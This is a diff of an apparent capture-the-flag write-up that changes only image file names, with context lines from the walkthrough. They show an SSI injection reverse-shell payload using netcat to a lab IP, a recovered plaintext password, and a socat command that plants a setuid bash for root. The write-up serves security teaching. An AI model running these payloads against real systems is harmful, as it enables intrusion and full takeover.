@@ -37,7 +37,7 @@ It is thus likely that there's a web exploit, so we can start proxying traffic t
 
 Port 80 was running a custom dashboard:
 
-<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (16) (11).png" alt=""><figcaption></figcaption></figure>
 
 The File Manager was running elFinder, but we cannot access it since we need administrative access:
 
@@ -45,11 +45,11 @@ The File Manager was running elFinder, but we cannot access it since we need adm
 
 I checked the user tab, and found that the user was called `mindsflee`:
 
-<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>
 
 All of options were under construction, except for the one on the right most.&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (21) (4).png" alt=""><figcaption></figcaption></figure>
 
 From my enumeration, this seems to be the most vulnerable point. I attempted to upload some PHP webshells, but it seems only images are allowed.
 
@@ -65,11 +65,11 @@ Hacktricks has done a page on SSI Injection that we could try.
 
 We can try some of the payloads:
 
-<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (20) (2).png" alt=""><figcaption></figcaption></figure>
 
 If we follow the redirect, we get this:
 
-<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (6) (4).png" alt=""><figcaption></figcaption></figure>
 
 We now have RCE on the machine, and we can easily get a reverse shell using this:
 
@@ -77,7 +77,7 @@ We now have RCE on the machine, and we can easily get a reverse shell using this
 <!--#exec cmd='nc -c bash 192.168.45.189 21' -->
 ```
 
-<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5) (8).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -138,7 +138,7 @@ password: m1ndsfl33w1llc4tchy0u?
 
 Using this password, we can `su` to `mindsflee`.
 
-<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 ### Sudo Privileges --> Socket Injection
 
@@ -243,8 +243,8 @@ echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat -
 
 When we enter that command, the script starts waiting for data to be sent in, which it passes to `os.system(datagram)`. This would result in RCE as `root`:
 
-<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can then easily get a `root` shell:
 
-<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (22) (12).png" alt=""><figcaption></figcaption></figure>
